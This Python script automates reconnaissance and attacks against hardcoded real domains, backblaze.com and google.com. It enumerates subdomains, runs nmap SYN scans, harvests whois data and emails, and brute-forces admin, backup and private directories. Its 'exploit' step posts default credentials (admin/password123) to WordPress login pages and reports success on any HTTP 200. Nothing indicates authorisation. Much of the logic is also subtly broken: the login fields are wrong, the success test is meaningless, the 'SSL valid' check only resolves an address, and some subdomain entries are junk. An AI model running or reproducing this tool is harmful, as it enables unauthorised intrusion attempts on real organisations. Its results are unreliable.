import requests
import socket
from bs4 import BeautifulSoup
import nmap
import itertools
import os
import threading
import whois
import logging
import concurrent.futures
import time

COMMON_SUBDOMAINS = ["www", "mail", "remote", "blog", "webmail", "server", "ns1", "ns2", "smtp", "secure", "vpn", "m",
                     "shop", "ftp", "mail2", "test", "portal", "ns", "ww1", "host", "support", "dev", "web", "bbs",
                     "ww42", "mx", "email", "cloud", "1", "mail1", "2", "forum", "owa", "www2", "gw", "admin", "store",
                     "mx1", "cdn", "api", "exchange", "app", "gov", "2tty", "vps", "govyty", "hgfgdf", "news", "1rer",
                     "lkjkui"]

COMMON_PORTS = [80, 443, 22]

MAX_CONCURRENT_REQUESTS = 10
MAX_RETRIES = 3
INITIAL_BACKOFF_DELAY = 1

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] [%(levelname)s] %(message)s")


def find_subdomains(target):
    subdomains = []

    for subdomain in COMMON_SUBDOMAINS:
        domain = subdomain + "." + target
        try:
            socket.gethostbyname(domain)
            subdomains.append(domain)
        except socket.error:
            pass

    return subdomains


def scan_ports(subdomain):
    open_ports = []

    scanner = nmap.PortScanner()

    scanner.scan(subdomain, arguments=f"-sS -p {','.join(map(str, COMMON_PORTS))}")

    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                if scanner[host][proto][port]['state'] == 'open':
                    open_ports.append(port)

    return open_ports


def identify_technologies(subdomain):
    technologies = []

    response = requests.get("https://" + subdomain)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")

        if soup.find("meta", attrs={"name": "generator", "content": "WordPress"}):
            technologies.append("WordPress")

        scripts = soup.find_all("script")
        for script in scripts:
            if "jquery" in str(script):
                technologies.append("jQuery")

    return technologies


def test_vulnerabilities(subdomain):
    vulnerabilities = []

    response = requests.get("https://" + subdomain)

    if response.status_code == 200:
        if "wp-login.php" in response.text:
            vulnerabilities.append("WordPress login page exposed")

    return vulnerabilities


def gather_information(subdomain):
    information = {}

    try:
        w = whois.whois(subdomain)
        information['Domain Name'] = w.domain_name
        information['Registrar'] = w.registrar
        information['Creation Date'] = w.creation_date
        information['Expiration Date'] = w.expiration_date
        information['Updated Date'] = w.updated_date
        information['Name Servers'] = w.name_servers
        information['Status'] = w.status
        information['Emails'] = w.emails
        information['DNSSEC'] = w.dnssec
    except whois.parser.PywhoisError:
        pass

    return information


def exploit_vulnerability(subdomain):
    response = requests.get("https://" + subdomain)

    if response.status_code == 200:
        if "wp-login.php" in response.text:
            login_url = "https://" + subdomain + "/wp-login.php"
            payload = {"username": "admin", "password": "password123"}
            exploit_response = requests.post(login_url, data=payload)

            if exploit_response.status_code == 200:
                logging.info("Exploited vulnerability in %s", subdomain)


def additional_functionality(subdomain, technologies, vulnerabilities, information):
    try:
        ssl_info = socket.getaddrinfo(subdomain, 443, socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        if ssl_info:
            logging.info("SSL Certificate is valid for %s", subdomain)
    except socket.error:
        pass

    try:
        ip_address = socket.gethostbyname(subdomain)
        logging.info("IP Address for %s: %s", subdomain, ip_address)
    except socket.error:
        pass

    filename = os.path.join("Reports", subdomain + "_info.txt")
    with open(filename, "w") as file:
        file.write("Subdomain: " + subdomain + "\n")
        file.write("Open Ports: " + str(scan_ports(subdomain)) + "\n")
        file.write("Technologies: " + str(technologies) + "\n")
        file.write("Vulnerabilities: " + str(vulnerabilities) + "\n")
        file.write("Information: " + str(information) + "\n")

    custom_directories = ["admin", "wp-admin", "login", "uploads", "backup", "test", "dev", "temp", "data", "private"]

    for directory in custom_directories:
        protocols = ["https://"]

        for protocol in protocols:
            url = protocol + subdomain + "/" + directory
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    logging.info("Found directory: %s", url)
            except (requests.exceptions.RequestException, socket.error) as e:
                logging.error("Error occurred while requesting %s: %s", url, e)


def process_subdomain(target, subdomain):
    open_ports = scan_ports(subdomain)
    logging.info("Open Ports for %s: %s", subdomain, open_ports)

    technologies = identify_technologies(subdomain)
    logging.info("Technologies for %s: %s", subdomain, technologies)

    vulnerabilities = test_vulnerabilities(subdomain)
    logging.info("Vulnerabilities for %s: %s", subdomain, vulnerabilities)

    information = gather_information(subdomain)
    logging.info("Information for %s: %s", subdomain, information)

    exploit_vulnerability(subdomain)

    additional_functionality(subdomain, technologies, vulnerabilities, information)


def handle_request(url):
    try:
        response = requests.get(url, timeout=10)
        return response
    except (requests.exceptions.RequestException, socket.error) as e:
        logging.error("Error occurred while requesting %s: %s", url, e)
        return None


def main():
    try:
        targets = ["backblaze.com", "google.com"]

        for target in targets:
            subdomains = find_subdomains(target)
            logging.info("Subdomains: %s", subdomains)

            with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_CONCURRENT_REQUESTS) as executor:
                futures = []
                for subdomain in subdomains:
                    url = "https://" + subdomain
                    future = executor.submit(handle_request, url)
                    futures.append(future)

                for future, subdomain in zip(futures, subdomains):
                    response = future.result()
                    if response and response.status_code == 200:
                        logging.info("Successful response from %s", subdomain)
                        process_subdomain(target, subdomain)

        logging.info("Scanning completed.")

    except KeyboardInterrupt:
        logging.info("Keyboard interrupt received. Exiting...")


if __name__ == "__main__":
    main()
